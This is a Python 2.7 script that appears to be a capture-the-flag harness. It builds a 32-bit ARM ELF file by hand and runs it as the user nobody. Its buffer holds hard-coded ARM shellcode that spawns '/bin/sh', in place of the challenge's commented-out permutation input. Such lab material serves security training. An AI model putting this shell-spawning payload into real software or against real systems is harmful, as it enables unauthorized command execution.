#!/usr/bin/env python2.7
import tempfile
import fcntl
import os
import sys
import time
import subprocess

# os.chdir("/home/problem/permute")

buf = map(chr, range(256))
buf="\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30\x04\x38\x49\x1a\x0a\x1c\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
# while 1:
#     a,b = map(ord, sys.stdin.read(2))
#     print "a was: %s"%a
#     print "b was: %s"%b
#     if a == b:
#         break
#     buf[a], buf[b] = buf[b], buf[a]
    # print buf
from struct import pack

fn = 'submit/%d' % os.getpid()
for i in xrange(100):
    try:
        os.unlink(fn)
    except OSError:
        pass

    try:
        fd = os.open(fn, os.O_RDWR | os.O_EXCL | os.O_CREAT, 0711)
        fcntl.fcntl(fd, fcntl.F_SETFD, fcntl.FD_CLOEXEC | fcntl.fcntl(fd, fcntl.F_GETFD))
        break
    except OSError:
        time.sleep(0.01)
else:
    print "Sorry, couldn't run your code. Try again later."
    sys.exit(1)

elf = '\x7fELF' + pack('<BBBB', 1,1,1,0) # header, class=32bit, data=little, version=1, osabi=sysv
elf += pack('<8x') # pad
elf += pack('<HHI', 2, 0x28, 1) # type=exec, machine=ARM, version=1
elf += pack('<III', 0x8000, 0x34, 0) # entry, phoff, shoff
elf += pack('<IHHH', 0x5000000, 0x34, 0x20, 1) # flags, ehsize, phentsize, phnum
elf += pack('<HHH', 0x28, 0, 0) # shentsize, shnum, shstrndx

elf += pack('<IIIIIIII', 1, 0x1000, 0x8000, 0x8000, # type=LOAD, offset, vaddr, paddr
                        0x1000, 0x1000, 0x5, 0x1000) # filesz, memsz, flags, align
elf = elf.ljust(0x1000, '\0')
elf += ''.join(buf).ljust(0x1000, '\0')

os.write(fd, elf)
os.close(fd)
try:
    p = subprocess.Popen(['/usr/bin/setsid', '/usr/bin/sudo', '-u', 'nobody', fn])
    p.wait(timeout=60)
except:
    print "Timeout"
    os.killpg(p.pid, 9)
    p.wait()
# except:
#     print "Sorry, submission execution failed."
# finally:
# 	print "derp"
#     # os.unlink(fn)
